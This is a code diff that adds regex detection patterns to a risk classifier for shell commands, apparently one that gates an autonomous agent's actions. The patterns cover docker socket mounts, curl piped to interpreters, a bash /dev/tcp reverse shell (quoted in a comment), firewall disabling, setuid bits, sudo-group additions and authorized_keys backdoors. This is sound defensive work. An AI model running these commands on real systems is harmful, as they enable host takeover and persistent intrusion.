@@ -102,6 +102,34 @@ const CRITICAL_PATTERNS = [
     label: 'eval of base64-decoded payload',
     re: /\b(?:eval|exec|sh|bash)\s+[^\n]*\bbase64\s+(?:-d|--decode|-D)\b/,
   },
+  // (v1.10.54) Catastrophic but missing from the original catalog.
+  {
+    code: 'docker-sock-mount',
+    label: 'docker run -v /var/run/docker.sock (container escape)',
+    // Mounting the docker socket into a container hands root on the
+    // host to whoever runs that container. Same severity as
+    // privileged: catastrophic, no benign cause.
+    re: /\bdocker\s+(?:run|create|exec)\s+[^\n;|&]*-v\s+\/var\/run\/docker\.sock/,
+  },
+  {
+    code: 'curl-pipe-interpreter',
+    label: 'curl | python / perl / ruby / node (remote code exec)',
+    // Same shape as curl-pipe-shell but for non-shell interpreters —
+    // remote one-liners that fetch and run untrusted code without
+    // human review.
+    re: /\b(?:curl|wget)\s[^\n|]*\|\s*(?:python\d*|perl|ruby|node|php)\b/,
+  },
+  {
+    code: 'reverse-shell',
+    label: 'classic reverse-shell construction',
+    // bash -i >& /dev/tcp/host/port 0>&1 — bash's internal /dev/tcp
+    // pseudo-device opens a TCP socket without netcat. Always
+    // catastrophic: there's no legitimate reason to write that.
+    // The negation excludes `\n` and `;` (statement boundaries) but
+    // NOT `&` / `|` because the construction itself uses `>&` for
+    // file-descriptor redirection.
+    re: /\bbash\s+-i\b[^\n;]*\/dev\/tcp\//,
+  },
 ];
 
 // High: dangerous but legitimately useful. Escalate to operator.
@@ -181,6 +209,57 @@ const HIGH_PATTERNS = [
     label: 'reboot / shutdown / halt',
     re: /\b(?:reboot|shutdown|halt|poweroff|init\s+0|init\s+6)\b/,
   },
+  // (v1.10.54) Operationally dangerous: legitimate uses exist, but
+  // unattended autonomous runs should escalate.
+  {
+    code: 'firewall-disable',
+    label: 'firewall flush / disable (iptables -F / ufw disable / nft flush ruleset)',
+    re: /\b(?:iptables\s+-F\b|ufw\s+(?:disable|reset)\b|nft\s+flush\s+ruleset\b)/,
+  },
+  {
+    code: 'systemctl-disable-critical',
+    label: 'systemctl stop|disable on a critical service (ssh / firewall / audit)',
+    re: /\bsystemctl\s+(?:stop|disable|mask)\s+(?:ssh|sshd|firewalld|ufw|nftables|auditd|apparmor|fail2ban)\b/,
+  },
+  {
+    code: 'pip-break-system',
+    label: 'pip install --break-system-packages (PEP 668 override)',
+    // Forces installs into the system Python, bypassing the
+    // distribution's "managed by apt" guard. Routinely produces
+    // unbootable systems.
+    re: /\bpip3?\s+install\s+[^\n;|&]*--break-system-packages\b/,
+  },
+  {
+    code: 'npm-global-install',
+    label: 'npm install -g / yarn global add (system-wide write)',
+    // -g installs into a system-owned prefix; under sudo it can
+    // shim binaries that other users depend on.
+    re: /\b(?:npm\s+install\s+(?:-g\b|--global\b)|yarn\s+global\s+add\b)/,
+  },
+  {
+    code: 'suid-set',
+    label: 'chmod u+s / setuid bit (privilege escalation primitive)',
+    re: /\bchmod\s+(?:[0-7]{0,3}[0-9]?[0-7]{2,3}|u\+s|\+s)\s+\S/,
+  },
+  {
+    code: 'usermod-sudo',
+    label: 'usermod / gpasswd add to sudo / wheel / docker group',
+    // Both argument orders matter:
+    //   usermod -aG <groups> <user>     (group(s) first)
+    //   gpasswd -a <user> <group>       (user first)
+    // We don't pin the position — just that the privileged group
+    // name appears anywhere on the same logical line after the
+    // membership-mutating verb.
+    re: /\b(?:usermod\s+-aG?|usermod\s+--append\s+--groups|gpasswd\s+-a)\b[^\n;]*\b(?:sudo|wheel|root|docker)\b/,
+  },
+  {
+    code: 'authorized-keys-append',
+    label: 'append to ~/.ssh/authorized_keys',
+    // Distinct from system-files (which catches /etc/* writes) — this
+    // is the classic backdoor: append a public key to a user's
+    // authorized_keys so the attacker keeps SSH access.
+    re: />>?\s*(?:~|\$HOME|\/home\/[^\s/]+|\/root)\/\.ssh\/authorized_keys\b/,
+  },
 ];
 
 // Medium: needs caution (usually ask in autonomous mode).
@@ -220,6 +299,27 @@ const MEDIUM_PATTERNS = [
     code: 'cron-edit',
     label: 'crontab edit',
     re: /\bcrontab\s+(?:-e|-r)\b/,
+  },
+  // (v1.10.54) Settings drift: rarely catastrophic but worth a review
+  // gate in autonomous runs since the change persists per-user/global.
+  {
+    code: 'git-config-global',
+    label: 'git config --global / --system',
+    re: /\bgit\s+config\s+(?:--global|--system)\b/,
+  },
+  {
+    code: 'pkg-config-set',
+    label: 'npm config set / yarn config set (registry / token writes)',
+    re: /\b(?:npm|yarn|pnpm)\s+config\s+set\s+\S/,
+  },
+  {
+    code: 'netcat-listen',
+    label: 'nc / ncat listening on a port (potential backdoor)',
+    // Detects any combined flag block containing `l` after nc / ncat
+    // — `-l`, `-lp`, `-lvp`, `--listen`. The `\S*l\S*` form lets `l`
+    // sit anywhere in the flag chunk so combined-short-options work.
+    // Even a benign port-open is review-worthy in autonomous mode.
+    re: /\b(?:nc|ncat)\s+(?:-\S*l\S*|--listen)\b/,
   },
 ];
 
